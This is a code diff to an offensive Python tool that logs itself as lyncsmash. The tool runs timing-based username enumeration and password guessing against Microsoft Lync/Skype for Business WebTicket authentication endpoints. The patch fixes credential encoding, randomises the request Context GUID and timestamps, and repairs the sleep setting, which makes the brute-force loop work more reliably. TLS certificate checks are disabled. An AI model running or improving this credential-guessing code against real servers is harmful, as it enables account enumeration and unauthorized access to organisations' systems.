@@ -16,6 +16,7 @@ import random
 import requests
 import datetime
 import time
+import uuid
 
 try:
         requests.packages.urllib3.disable_warnings()
@@ -73,7 +74,8 @@ def main():
                        global outputfile
                        outputfile = args.outfile
                 if args.sleep is not None:
-                       apSleep=args.sleep
+                       global apSleep
+                       apSleep = args.sleep
                 #okay, if we have a username file, proceed
                 if os.path.isfile(args.usernames):
                         # get a baseline timeout - this is response time for invalid usernames
@@ -91,9 +93,6 @@ def main():
                                     with open(args.passwdfile) as pass_file:
                                         for password in pass_file:
                                             timing_attack(args.host.rstrip(), args.usernames.rstrip(), password.rstrip(), args.domain.rstrip(), args.randomize)
-
-                                    pass_file.close()
-
                 else:
                         print_error('Could not find username file')
 
@@ -197,7 +196,6 @@ def timing_attack(host,userfilepath,password,domain, randomize):
         elapsed_time=endtime - currenttime
         f.write("Finished lyncsmash at {0}\n".format(currenttime))
         f.write("Elapsed time {0}\n".format(elapsed_time))
-        user_file.close()
 
 # Determine the baseline timeout for invalid username
 def baseline_timeout(host, domain):
@@ -228,16 +226,19 @@ def send_xml(host, domain, user, passwd):
         global validCred
         global isDisabled
         domain_user = "{0}\\{1}".format(domain, user)
-        encoded_username = base64.b64encode(domain_user.encode('ascii'))
-        encoded_password = base64.b64encode(passwd.encode('ascii'))
+        encoded_username = base64.b64encode(domain_user.encode('ascii')).decode('utf-8')
+        encoded_password = base64.b64encode(passwd.encode('ascii')).decode('utf-8')
 
+        created_time = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')
+        expires_time = (datetime.datetime.now() + datetime.timedelta(minutes=15)).strftime('%Y-%m-%dT%H:%M:%SZ')
+        context_str = str(uuid.uuid4())
 
-        xml_data = "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Header><Security s:mustUnderstand=\"1\" xmlns:u=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\" xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\"><UsernameToken><Username>{0}</Username><Password Type=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText\">{1}</Password></UsernameToken></Security></s:Header><s:Body><RequestSecurityToken xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Context=\"ec86f904-154f-0597-3dee-59eb1b51e731\" xmlns=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\"><TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType><RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType><AppliesTo xmlns=\"http://schemas.xmlsoap.org/ws/2004/09/policy\"><EndpointReference xmlns=\"http://www.w3.org/2005/08/addressing\"><Address>https://2013-lync-fe.contoso.com/WebTicket/WebTicketService.svc/Auth</Address></EndpointReference></AppliesTo><Lifetime><Created xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">2016-06-07T02:23:36Z</Created><Expires xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">2016-06-07T02:38:36Z</Expires></Lifetime><KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>".format(encoded_username,encoded_password)
+        lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
+        xml_data = "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Header><Security s:mustUnderstand=\"1\" xmlns:u=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\" xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\"><UsernameToken><Username>{0}</Username><Password Type=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText\">{1}</Password></UsernameToken></Security></s:Header><s:Body><RequestSecurityToken xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Context=\"{2}\" xmlns=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\"><TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType><RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType><AppliesTo xmlns=\"http://schemas.xmlsoap.org/ws/2004/09/policy\"><EndpointReference xmlns=\"http://www.w3.org/2005/08/addressing\"><Address>{3}</Address></EndpointReference></AppliesTo><Lifetime><Created xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">{4}</Created><Expires xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">{5}</Expires></Lifetime><KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>".format(encoded_username,encoded_password, context_str, lync_url, created_time, expires_time)
 
         headers = {'Content-Type': 'text/xml; charset=utf-8','User-Agent': 'UCCAPI/16.0.13328.20130 OC/16.0.13426.20234'}
         try:
-            #print xml_data
-            lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
+            # print(xml_data)
             webholder = requests.post(lync_url, headers=headers, data=xml_data, verify=False)
             if 'No valid' in webholder.text:
                 validCred = False
